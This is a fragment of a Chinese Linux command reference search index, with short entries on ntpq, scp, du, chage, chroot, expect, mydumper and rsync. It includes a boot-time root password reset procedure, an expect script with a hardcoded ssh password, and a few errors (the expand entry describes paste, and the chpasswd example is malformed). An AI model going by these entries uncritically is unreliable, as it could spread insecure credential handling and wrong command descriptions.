LC_ADDRESS Address formats and location information. LC_TELEPHONE Telephone number formats. LC_MEASUREMENT Measurement units (Metric or Other). LC_IDENTIFICATION Metadata about the locale information. This environment variable can switch against multiple locale database: LOCPATH The directory where locale data is stored. By default, /usr/lib/locale is used.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Locale-Gen.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Locale-Gen.html"},{"title":"ntpq","text":"ntpq指令使用NTP模式6数据包与NTP服务器通信,能够在允许的网络上查询的兼容的服务器。它以交互模式运行,或者通过命令行参数运行。 此命令的适用范围：RedHat、RHEL、Ubuntu、CentOS、Fedora。 语法格式: ntpq [参数] 常用参数 -4 使用ipv4解析 -6 使用ipv6解析 -d 打开调试模式 -i 使用交互模式 -n 以十进制格式显示主机地址 -p 显示服务器同级设备的列表 -c [command] 添加执行的命令到指定主机的命令列表 注解 设置ntp的时候，server表示对时服务器，restrict表示对服务器做限制 restrict选项 restrict选项格式: restrict [ 客户端IP ] mask [ IP掩码 ] [参数] \"客户端IP\" 和 \"IP掩码\" 指定了对网络中哪些范围的计算机进行控制， 如果使用default关键字，则表示对所有的计算机进行控制，参数指定了具体的限制内容，常见的参数如下： ◆ ignore 拒绝连接到NTP服务器 ◆ nomodiy 忽略所有改变NTP服务器配置的报文，但可以查询配置信息 ◆ noquery 忽略所有mode字段为6或7的报文，客户端不能改变NTP服务器配置，也不能查询配置信息 ◆ notrap 不提供trap远程登录功能，trap服务是一种远程时间日志服务。 ◆ notrust 不作为同步的时钟源。 ◆ nopeer 提供时间服务，但不作为对等体。 ◆ kod 向不安全的访问者发送Kiss-Of-Death报文。 server选项 server选项格式: server host [ key n ] [ version n ] [ prefer ] [ mode n ] [ minpoll n ] [ maxpoll n ] [ iburst ] 其中host是上层NTP服务器的IP地址或域名，随后所跟的参数解释如下所示： ◆ key 表示所有发往服务器的报文包含有秘钥加密的认证信息，n是32位的整数，表示秘钥号。 ◆ version 表示发往上层服务器的报文使用的版本号，n默认是3，可以是1或者2。 ◆ prefer 如果有多个server选项，具有该参数的服务器有限使用。 ◆ mode 指定数据报文mode字段的值。 ◆ minpoll 指定与查询该服务器的最小时间间隔为2的n次方秒，n默认为6，范围为4-14。 ◆ maxpoll 指定与查询该服务器的最大时间间隔为2的n次方秒，n默认为10，范围为4-14。 ◆ iburst 当初始同步请求时，采用突发方式接连发送8个报文，时间间隔为2秒。 参考: ntp服务器restrict和server选项格式","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-NTPQ.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-NTPQ.html"},{"title":"parted","text":"列出磁盘的分区表类型与分区信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PARTED.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PARTED.html"},{"title":"pv","text":"Pipe Viewer 显示当前在命令行执行的命令的进度信息，管道查看器 -p , --progress 显示进度条 -t , --timer 显示已用时间 -e , --eta 显示预计到达时间 (完成) -I , --fineta 显示绝对估计到达时间 (完成) -r , --rate 显示数据传输速率计数器 -a , --average-rate 显示数据传输平均速率计数器 -b , --bytes 显示传输的字节数 -T , --buffer-percent 显示正在使用的传输缓冲区百分比 -A , --last-written NUM 显示上次写入的字节数 -F , --format FORMAT 将输出格式设置为FORMAT -n , --numeric 输出百分比 -q , --quiet 不输出任何信息(不显示进度条) -W , --wait 在传输第一个字节之前不显示任何内容 -D , --delay-start SEC 在SEC秒过去之前不显示任何内容 -s , --size SIZE 将估算的数据大小设置为SIZE字节 -l , --line-mode 计算行数而不是字节数 -0 , --null 行以零结尾 -i , --interval SEC 每SEC秒更新一次 -w , --width WIDTH 假设终端的宽度为WIDTH个字符 -H , --height HEIGHT 假设终端高度为HEIGHT行 -N , --name NAME 在可视信息前面加上名称 -f , --force 将标准错误输出到终端 -c , --cursor 使用光标定位转义序列 -L , --rate-limit RATE 将传输限制为每秒RATE字节, -L<num>每秒打印的字节数 -B , --buffer-size BYTES 使用BYTES的缓冲区大小 -C , --no-splice 从不使用splice()，始终使用读/写 -E , --skip-errors 跳过输入中的读取错误 -S , --stop-at-size 传输--size字节后停止 -R , --remote PID 更新过程PID的设置 -P , --pidfile FILE 将进程ID保存在FILE中 -d, --watchfd PID[:FD] 监视进程PID,打开的文件FD -h, --help 显示帮助 -V, --version 显示版本信息 示例 匀速打印: echo \"xxxxxxx\" | pv -qL 10 此示例参考: linux有趣的命令","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PV.html"},{"title":"readlink","text":"Linux 系统中一个常用工具，主要用来找出符号链接所指向的位置 -f 递归跟随给出文件名的所有符号链接以标准化，除最后一个外所有组件必须存在。 简单地说，就是一直跟随符号链接，直到非符号链接的文件位置， 限制是最后必须存在一个非符号链接的文件。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readlink.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readlink.html"},{"title":"scp","text":"加密 的方式在本地主机和远程主机之间复制文件（基于ssh） 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有 cp， 不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。 可能会稍微影响一下速度。 当你服务器硬盘变为只读read only system时，用scp可以帮你把文件移出来。 另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。 虽然 rsync比scp会快一点，但当小文件众多的情况下， rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。 语法 : scp(选项)(参数) 选项 -1 强制scp命令使用协议ssh1 -2 强制scp命令使用协议ssh2 -4 强制scp命令只使用IPv4寻址 -6 强制scp命令只使用IPv6寻址 -B 使用批处理模式（传输过程中不询问传输口令或短语） -C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） -p 保留原文件的修改时间，访问时间和访问权限。 -q 不显示传输进度条。 -r 递归复制整个目录。 -v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 -c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 -F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 -i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。 -l limit 限定用户所能使用的带宽，以Kbit/s为单位。 -o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， -P port 注意是大写的P, port是指定数据传输用到的端口号 -S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。 参数 源文件：指定要复制的源文件。 目标文件：目标文件。格式为`user@host：filename`（文件名为目标文件的名称）。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SCP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SCP.html"},{"title":"seq","text":"以指定增量从首数开始打印数字到尾数 -f, --format=格式 使用printf 样式的浮点格式 -s, --separator=字符串 使用指定字符串分隔数字（默认使用：n） -w, --equal-width 在列前添加0 使得宽度相同 #%后面指定数字的位数 默认是%g，%3g那么数字位数不足部分是空格: #seq -f\"%3g\" 9 11 9 10 11","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SEQ.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SEQ.html"},{"title":"ssh","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SSH.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SSH.html"},{"title":"du","text":"du，disk usage, 是通过搜索文件来计算每个文件的大小然后累加， du能看到的文件只是一些当前存在的，没有被删除的。 他计算的大小就是当前他认为存在的所有文件大小的累加和 -s 指定文件系统中所有的目录、符号链接和文件使用的块数累加得到该文件系统使用的总块数 相关指令: df 与df区别 如: [root@www ~]# du -sh /home 4.7G /home [root@www ~]# df -h /home Filesystem Size Used Avail Use% Mounted on /dev/sda5 15G 4.9G 8.9G 36% /home [root@www ~]# df 命令 通过查看文件系统磁盘块分配图得出总块数与剩余块数。 文件系统分配其中的一些磁盘块用来记录它自身的一些数据，如i节点，磁盘分布图，间接块，超级块等。 这些数据对大多数用户级的程序来说是不可见的，通常称为Meta Data。 du 命令 是用户级的程序，它不考虑Meta Data， 而df命令则查看文件系统的磁盘分配图并考虑Meta Data。 df命令获得真正的文件系统数据，而du命令只查看文件系统的部分情况。 与ls区别 文件大小的两个概念 文件占用磁盘空间的大小 文件实际的大小 du -k属于第一种，计算的是文件占用磁盘空间的大小。 在电脑的文件系统中，存储是以块(Block)为单位的，不同的系统块的大小不一样， 比如说 macOS 一个块的大小是 4096 字节。假设一个文件有 4097 字节，4097-4096=1， 这个文件在占用了一个块之后，还有一个字节会占用到一个块， 而块与块之间是不共享空间的，也就是说，剩下的 1 字节占用了一个块， 这个块还空出 4095 字节，但是无法用于存储其他文件。 所以，这个大小为 4097 字节的文件占用了 2 个块。 而 du -k 计算的正是每个文件占用块的多少。 同理可得，其中必定有部分块是没有占满的，所以和实际的文件大小有差异。 ls -l查看文件实际大小而非块大小","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Spend.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Spend.html"},{"title":"unalias","text":"去除 /docs/操作系统/linux/linux指令/alias 设置的别名","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Unalias.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Unalias.html"},{"title":"adjtimex","text":"linux系统有两个时钟： 一个是由主板电池驱动的\"Real Time Clock\"也叫做RTC或者叫CMOS时钟，硬件时钟。 当操作系统关机的时候，用这个来记录时间，但是对于运行的系统是不用这个时间的。 另一个时间是 \"System clock\"也叫内核时钟或者软件时钟， 是由软件根据时间中断来进行计数的，内核时钟在系统关机的情况下是不存在的， 所以，当操作系统启动的时候，内核时钟是要读取RTC时间来进行时间同步 （有些情况下，内核时钟也可以通过ntp服务器来读取时间） 这两个时钟通常会有一些误差， 所以长时间可以导致这两个时钟偏离的比较多， 最简单的保持两个时间同步的方法是用软件测出他们之间的误差率，然后用软件进行修正。 adjtimex选项 -p, –print 输出内核时间变量的值 -t, –tick val 设置内核时钟计数间隔（微秒） -f, –frequency newfreq 设置系统时钟偏移量 -c, –compare[=count] 比较系统时钟和CMOS时钟 -i, –interval tim 设置时钟比较间隔时间 (sec) -l, –log[=file] 将当前时间记录到文件中 –host timeserver 查询时间服务器 -u, –utc 将CMOS时钟设置成UTC 每次重启NTP服务器之后大约要3－5分钟客户端才能与server建立正常的通讯连接","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-adjtimex.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-adjtimex.html"},{"title":"alias","text":"命令别名 如: alias lm='ls -al | more' 使用 unalias 去除","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-alias.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-alias.html"},{"title":"ss","text":"查看本地连接 ss命令可以传递的参数： -t 显示TCP端口 -u 显示UDP端口 -n 不解析主机名 -l 显示监听端口 -p 显示进程 -4 仅显示IPv4的socket连接","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-at-any-time.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-at-any-time.html"},{"title":"basename","text":"打印目录或者文件的基本名称。 basename和 dirname 命令通常用于shell脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。 要显示一个shell变量的基本名称，请输入: basename $WORKFILE","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-basename.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-basename.html"},{"title":"blkid","text":"列出装置的uuid","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-blkid.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-blkid.html"},{"title":"chage","text":"用来修改帐号和密码的有效期限。 语法 : chage [选项] 用户名 选项 -m 密码可更改的最小天数。为零时代表任何时候都可以更改密码。 -M 密码保持有效的最大天数。 -w 用户密码到期前，提前收到警告信息的天数。 -E 帐号到期的日期。过了这天，此帐号将不可用。 -d 上一次更改的日期。 -i 停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。 -l 例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。 我的服务器root帐户密码策略信息如下: [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ：从不 密码失效时间 ：从不 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：99999 在密码过期之前警告的天数 ：7 我可以通过如下命令修改我的密码过期时间: [root@linuxde ~]# chage -M 60 root [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ： 5月 11, 2013 密码失效时间 ：从不 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：60 在密码过期之前警告的天数 ：9 然后通过如下命令设置密码失效时间: [root@linuxde ~]# chage -I 5 root [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ： 5月 11, 2013 密码失效时间 ： 5月 16, 2013 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：60 在密码过期之前警告的天数 ：9 从上述命令可以看到，在密码过期后5天，密码自动失效，这个用户将无法登陆系统了。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chage.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chage.html"},{"title":"chown","text":"Linux chown（change owner）用于变更文件或目录的拥有者或所属群组 语法: chown [-cfhvR] [--help] [--version] user[:group] file... 选项参数 -c 显示更改的部分的信息 -f 忽略错误信息 -h 修复符号链接 -v 显示详细的处理信息 -R 处理指定目录以及其子目录下的所有文件 --help 显示辅助说明 --version 显示版本 -f , --quite , --silent 不显示错误信息 --reference= <file> 使用 file 文件的所有者和组, 而不是指定的 user:group 其他: user : 新的文件拥有者的使用者 ID group : 新的文件拥有者的使用者组(group) 说明: #user:group 指定所有者和所属工作group。当省略\":group\"，仅改变文件所有者 #文件: 指定要改变所有者和工作group的文件列表。支持多个文件和目标，支持shell通配符。 chown -R user:group file","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chown.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chown.html"},{"title":"chpasswd","text":"读取未加密的密码，然后将加密后的密码写入 /etc/shadow: echo 'qwe123' | chpasswd","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chpasswd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chpasswd.html"},{"title":"chroot","text":"参考: https://www.cnblogs.com/sparkdev/p/8556075.html 即 change root directory (更改 root 目录)。 在 linux 系统中，系统默认的目录结构都是以 /，即以根 (root) 开始的。 而在使用 chroot 之后，系统的目录结构将以指定的位置作为 / 位置。 可以用它来简单的实现文件系统的隔离。 但在一个容器技术繁荣的时代，用 chroot 来进行资源的隔离实在是 low 了点。 所以 chroot 的主要用途还是集中在系统救援、维护等一些特殊的场景中。 语法: chroot NEWROOT [COMMAND [ARG]...] 为什么要使用 chroot 命令 增加了系统的安全性，限制了用户的权力: 在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。 一般会在用户登录前应用 chroot，把用户的访问能力控制在一定的范围之内。 建立一个与原系统隔离的系统目录结构，方便用户的开发: 使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。 在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。 切换系统的根目录位置，引导 Linux 系统启动以及急救系统等: chroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用， 从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init. 比如文末的用例. 参数选项 如果不给 chroot 指定执行的命令，默认它会执行 '${SHELL} -i'，而我的系统中 ${SHELL} 为 /bin/bash。 通过 chroot 运行 busybox 工具 busybox 包含了丰富的工具，我们可以把这些工具放置在一个目录下，然后通过 chroot 构造出一个 mini 系统。 简单起见我们直接使用 docker 的 busybox 镜像打包的文件系统。先在当前目录下创建一个目录 rootfs: $ mkdir rootfs 然后把 busybox 镜像中的文件释放到这个目录中: $ (docker export $(docker create busybox) | tar -C rootfs -xvf -) 通过 ls 命令查看 rootfs 文件夹下的内容: $ ls rootfs 执行 chroot 后的 ls 命令: $ sudo chroot rootfs /bin/ls 虽然输出结果与刚才执行的 ls rootfs 命令形同，但是这次运行的命令却是 rootfs/bin/ls。 运行 chroot 后的 pwd 命令: $ sudo chroot rootfs /bin/pwd / 可以看出直接把rootfs当作根目录. 检查程序是否运行在 chroot 环境下 通过 /proc 目录下的文件检查进程的中的根目录 如当打开一个sh会话: sudo chroot rootfs /bin/sh 检查/bin/sh根目录: pid=$(pidof -s sh) sudo ls -ld /proc/$pid/root 结果会打印实际的链接地址. 实例：通过 chroot 重新设置 root 密码 systemd 的管理机制中，rescure 模式和 emeryency 模式是无法直接取得 root 权限的， 需要使用 root 密码才能进入 rescure 和 emeryency 环境。 可以为内核的启动指定 \"rd.break\" 参数，从而让系统在启动的早期停下来， 此时我们可以通过使用 root 权限并结合 chroot 命令完成设置 root 密码的操作。 在系统启动过程中进入开机菜单时按下字母键 e 进程开机菜单的编辑模式 找到以 \"linux16 /vmlinuz-\" 开头的行。如果默认没有看到该行，需要按向下键把它滚动出来。 然后定位到该行结尾处，输入一个空格和字符串 \" rd.break\" 接着按下 ctrl + x 以该设置继续启动，启动过程中操作系统会停下来，这是系统启动过程中的一个非常早的时间点 所以系统的根目录还挂载在 RAM disk 上(就是内存中的一个文件系统)， 我们可以通过 mount 命令检查系统当前挂载的文件系统: mount 该时间点的最大优势是我们具有 root 权限！开始设置新的 root 密码。 把 /sysroot 重新挂载为 可读写的模式: mount -o remount,rw /sysroot chroot 命令把根目录切换到我们原来的 环境中: chroot /sysroot 此时可以理解为：我们以 root 权限登录了原来的系统，修改密码就很容易 为 root 用户设置新的 密码: echo \"new_root_pw\" | passwd --stdin root 接下来还要处理 SELinux 相关的问题。由于当前的环境中 SELinux 并未启动， 所以我们对文件的修改可能造成文件的 context 不正确。 为了确保开机时重新设定 SELinux context，必須在根目录下添加隐藏文件 .autorelabel: touch /.autorelabel 从 chroot 中退出， 并重启系统: exit reboot 重新进入登陆界面时就可以使用刚才设置的密码以 root 登陆了","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chroot.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chroot.html"},{"title":"col","text":"-x 将tab替换为空格","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-col.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-col.html"},{"title":"dirname","text":"相关指令: /docs/操作系统/linux/linux指令/basename","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dirname.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dirname.html"},{"title":"sz","text":"下载终端文件到本地 相关指令 rz","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-even.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-even.html"},{"title":"expect","text":"通过expect可以实现将交互式的命令变为非交互式执行，不需要人为干预(手动输入) 用法 option 含义 set timeout 30 设置超时时间30s spawn ${cmd} spawn是执行expect之后后执行的内部命令开启一个会话 #功能:用来执行shell的交互命令 expect 相当于捕捉 send 执行交互动作，将交互要执行的命令进行发送给交互指令，命令字符串结尾要加上\"r\"，#---相当于回车 interact 执行完后保持交互状态，需要等待手动退出交互状态，如果不加这一项，交互完成会自动退出 exp_continue 继续执行接下来的操作 实战非交互式ssh连接: [root@qfedu script]# vim test.sh #!/bin/sh expect -c \" set timeout 10 spawn ssh root@localhost expect { \\\"yes/no\\\" { send \\\"yes\\r\\\"; exp_continue } \\\"password:\\\" { send \\\"root\\r\\\" } } \" #注意花括号前一定要有空格 [root@qfedu script]# chmod +x test.sh [root@qfedu script]# ./test.sh spawn ssh root@localhost root@localhost's password: Last login: Fri Aug 28 16:57:09 2019 #如果添加interact参数将会等待我们手动交互进行退出。如果不加interact参数在登录成功之后会立刻退出。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exfect.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exfect.html"},{"title":"expand","text":"将两个文件相同行的数据粘在一起，以空格隔开 相似指令 paste","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-expand.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-expand.html"},{"title":"export","text":"export用于设置或显示环境变量, 显示当前导出成用户变量的shell变量(可以在当前shell以及子shell中使用的变量): -p 列出所有shell赋予程序的环境变量 -n 删除指定的环境变量。实际并未删除，只是不会输出到后续指令的执行环境中 -f 代表[变量名称]中为函数名称 还有一个特殊的作用是, 使用export导出后, 修改后的环境变量才对子进程可见, 如更新 PATH环境变量, 若只设置: PATH=\"/usr/local/new_path:$PATH\" 则生效范围只有当前shell, 使用: export PATH=$PATH 后才能对子进程可见 更规范的说法: 将一个shell私有变量使用export导出, 使其提升为用户变量.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-export.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-export.html"},{"title":"free","text":"显示内存的使用情况 -b 以Byte为单位显示内存使用情况； -k 以KB为单位显示内存使用情况； -m 以MB为单位显示内存使用情况； -g 以GB为单位显示内存使用情况。 -o 不显示缓冲区调节列； -s <间隔秒数> 持续观察内存使用状况； -t 显示内存总和列； -V 显示版本信息。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-free.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-free.html"},{"title":"head","text":"显示文件的开头部分。 -n, --lines=[-]NUM 显示前NUM行而不是默认的10行； 如果NUM前有\"-\"，那么会打印除了文件末尾的NUM行以外的其他行。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-head.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-head.html"},{"title":"host","text":"查出某个主机的ip 用法: host [-a] hostname [server] 选项与参数: -a 列该主机详细的各项主机名设定数据 [server] 可以使用非为 /etc/resolv.cnf 的DNS 服务器","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-host.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-host.html"},{"title":"locale","text":"设置系统语言环境 不带参数是查看已设置字符集 -a 查看已安装有字符集","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-locale.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-locale.html"},{"title":"mkfifo","text":"创建一个命令管道（FIFO）文件 可以通过 stdbuf -oL 来行缓冲读取","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkfifo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkfifo.html"},{"title":"mydumper","text":"数据库备份指令 -B , --database 要备份的数据库，不指定则备份所有库 -T , --tables-list 需要备份的表，名字用逗号隔开 -o , --outputdir 备份文件输出的目录 -s , --statement-size 生成的insert语句的字节数，默认1000000 -r , --rows 将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize -F , --chunk-filesize 将表按大小分块时，指定的块大小，单位是 MB -c , --compress 压缩输出文件 -e , --build-empty-files 如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件） -x , --regex 是同正则表达式匹配 'db.table' -i , --ignore-engines 忽略的存储引擎，用都厚分割 -m , --no-schemas 不备份表结构 -k , --no-locks 不使用临时共享只读锁，使用这个选项会造成数据不一致 --less-locking 减少对InnoDB表的锁施加时间（这种模式的机制下文详解） -l , --long-query-guard 设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出） --kill-long-queries 杀掉长查询 (不退出) -b , --binlogs 导出binlog -D , --daemon 启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份 -I , --snapshot-interval dump快照间隔时间，默认60s，需要在daemon模式下 -L , --logfile 使用的日志文件名(mydumper所产生的日志), 默认使用标准输出 --tz-utc 跨时区是使用的选项，不解释了 --skip-tz-utc 同上 --use-savepoints 使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限 --success-on-1146 Not increment error count and Warning instead of Critical in case of table doesn't exist -h , --host 连接的主机名 -u , --user 备份所使用的用户 -p , --password 密码 -P , --port 端口 -S , --socket 使用socket通信时的socket文件 -t , --threads 开启的备份线程数，默认是4 -C , --compress-protocol 压缩与mysql通信的数据 -V , --version 显示版本号 -v , --verbose 输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为 2 相关指令 myloader , 用于数据恢复","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mydumper.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mydumper.html"},{"title":"myloader","text":"数据恢复 -d , --directory 备份文件的文件夹 -q , --queries-per-transaction 每次事物执行的查询数量，默认是1000 -o , --overwrite-tables 如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构 -B , --database 需要还原的数据库 -e , --enable-binlog 启用还原数据的二进制日志 -h , --host 主机 -u , --user 还原的用户 -p , --password 密码 -P , --port 端口 -S , --socket socket文件 -t , --threads 还原所使用的线程数，默认是4 -C , --compress-protocol 压缩协议 -V , --version 显示版本 -v , --verbose 输出模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为2 相关指令 mydumper , 用于数据备份","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-myloader.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-myloader.html"},{"title":"nohub","text":"不挂断地运行命令。no hangup的缩写，意即\"不挂断\"。 nohup运行由 Command参数和任何相关的 Arg参数指定的命令，忽略所有挂断（SIGHUP）信号； 不挂断的运行，注意没有后台运行功能 。 就是指，用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系， 例如我们断开SSH连接都不会影响他的运行. 注解 nohup没有后台运行的意思；&才是后台运行 &是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出 那么，我们可以巧妙的吧他们结合起来用就是 nohup COMMAND & 这样就能使命令永久的在后台执行","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHub.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHub.html"},{"title":"partprobe","text":"更新linux核心的分区表信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-partprobe.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-partprobe.html"},{"title":"passwd","text":"修改密码","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-passwd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-passwd.html"},{"title":"paste","text":"将两个文件相同行的数据粘在一起，以tab隔开 相似指令 expand","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-paste.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-paste.html"},{"title":"patch","text":"对比两个文件变化 制作补丁","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-patch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-patch.html"},{"title":"df","text":"df，disk free， 通过文件系统来快速获取空间大小的信息， 当我们删除一个文件的时候，这个文件不是马上就在文件系统当中消失了， 而是暂时消失了，当所有程序都不用时， 才会根据OS的规则释放掉已经删除的文件， df记录的是通过文件系统获取到的文件的大小， 他比 du 强的地方就是 能够看到已经删除的文件 ， 而且计算大小的时候，把这一部分的空间也加上了， 更精确了。(当文件系统也确定删除了该文件后，这时候du与df就一致了。) 关于删除机制见 /docs/操作系统/linux/概念性/linux删除机制","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-place.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-place.html"},{"title":"rsync","text":"rsync 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。 rsync使用所谓的\"rsync算法\"来使本地和远程两个主机之间的文件达到同步， 这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。 语法: rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync有六种不同的工作模式 拷贝本地文件 当SRC和DES路径信息都不包含有单个冒号 \":\" 分隔符时就启动这种工作模式. 如: rsync -a /data /backup 本地->远程 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。 当DST路径地址包含单个冒号\":\"分隔符时启动该模式. 如: rsync -avz *.c foo:src 远程->本地 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。 当SRC地址路径包含单个冒号\":\"分隔符时启动该模式. 如: rsync -avz foo:src/bar /data 远程rsync服务->本地 